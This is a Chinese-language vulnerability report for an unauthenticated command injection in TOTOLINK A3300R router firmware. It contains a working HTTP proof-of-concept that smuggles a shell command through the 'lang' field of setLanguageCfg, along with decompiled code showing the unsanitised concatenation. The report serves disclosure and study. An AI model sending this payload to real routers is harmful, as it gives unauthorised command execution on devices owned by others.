# A3300R_Firmware
# TOTOlink A3300R_Firmware V17.0.0cu.557_B20221024 命令注入

## 产品信息

设备：A3300R_Firmware 
固件版本：V17.0.0cu.557_B20221024 
制造商网站信息：https://www.totolink.net/
固件下载地址：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

## 漏洞描述

cstecgi.cgi中lang存在未授权任意访问的命令执行

### URL:http://192.168.187.136/login.html

### POC:

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.187.136
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 77
Origin: http://192.168.187.136
Connection: close
Referer: http://192.168.187.136/login.html


{"lang":"`ls>/web/test2.txt`","langAutoFlag":"0","topicurl":"setLanguageCfg"}
```

注入命令“`ls>/web/test2.txt`”

检测结果。

![image-20231125222042937](https://raw.githubusercontent.com/zxsssd/testimages/main/image-20231125222042937.png)

```
GET /test2.txt HTTP/1.1
Host: 192.168.187.136
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 2

```

![image-20231125222325198](https://raw.githubusercontent.com/zxsssd/testimages/main/image-20231125222325198.png)

## 分析

shttpd中的libcscommon.so库的Uci_Set_Str函数命令参数容易受到操作系统命令注入的影响。程序调用get_uci2json的时候会在该so库内调用Uci_Set_Str造成任意命令执行，而且该接口setLanguageCfg免授权导致了未授权任意命令执行。

在shttpd的该部分调用了相关语言设置

```
  sub_40A4FC(a1, (int)"lang");
  sub_40A4FC(a1, (int)"langAutoFlag");
  Uci_Set_Str(11, "main", "lang_type");
  sub_410060(
    v37,
    v38,
    v39,
    (int)&v40,
    _40,
    _44,
    _48,
    _4C,
    a5,
    a6,
    a7,
    a8,
    a9,
    a10,
    a11,
    a12,
    a13,
    a14,
    a15,
    a16,
    a17,
    a18,
    a19,
    a20,
    a21,
    a22,
    a23,
    a24);
}
```

下面是libcscommon.so，查看Uci_Set_Str

```
int __fastcall Uci_Set_Str(int a1, int a2, int a3, int a4)
{
  int result; // $v0
  char *v8; // $a3
  char v9[1024]; // [sp+2Ch] [-408h] BYREF

  memset(v9, 0, sizeof(v9));
  result = 0;
  if ( a1 > 0 && a3 && a4 )
  {
    switch ( a1 )
    {
      case 1:
        v8 = "/tmp/cste/";
        break;
      case 2:
        v8 = "/tmp/cste/";
        break;
      case 3:
        v8 = "/tmp/cste/";
        break;
      case 4:
        v8 = "/tmp/cste/";
        break;
      case 5:
        v8 = "/tmp/cste/";
        break;
      case 6:
        v8 = "/mnt/";
        break;
      case 7:
        v8 = "/etc/config";
        break;
      case 8:
        v8 = "/etc/config";
        break;
      case 9:
        v8 = "/etc/config";
        break;
      case 10:
        v8 = "/etc/config";
        break;
      case 11:
        v8 = "/etc/config";
        break;
      case 12:
        v8 = "/etc/config";
        break;
      case 13:
        v8 = "/etc/config";
        break;
      case 14:
        v8 = "/etc/config";
        break;
      case 15:
        v8 = "/etc";
        break;
      case 16:
        v8 = "/etc/config";
        break;
      case 17:
        v8 = "/etc/config";
        break;
      case 18:
        v8 = "/etc/config";
        break;
      case 19:
        v8 = "/etc/config";
        break;
      case 20:
        v8 = "/etc/config";
        break;
      case 21:
        v8 = "/etc/config";
        break;
      case 22:
        v8 = "/etc/config";
        break;
      case 23:
        v8 = "/etc/config";
        break;
      case 24:
        v8 = "/etc/config";
        break;
      case 25:
        v8 = "/etc/config";
        break;
      case 26:
        v8 = "/etc/config";
        break;
      case 27:
        v8 = "/rom/etc/config";
        break;
      case 29:
        v8 = "/mnt/";
        break;
      default:
        v8 = "/etc/config";
        break;
    }
    snprintf(v9, 1024, "uci -c %s set %s.%s.%s=\"%s\"", v8);
    CsteSystem(v9, 0);
    return 1;
  }
  return result;
}
```

字符拼接，未过滤导致的任意命令执行
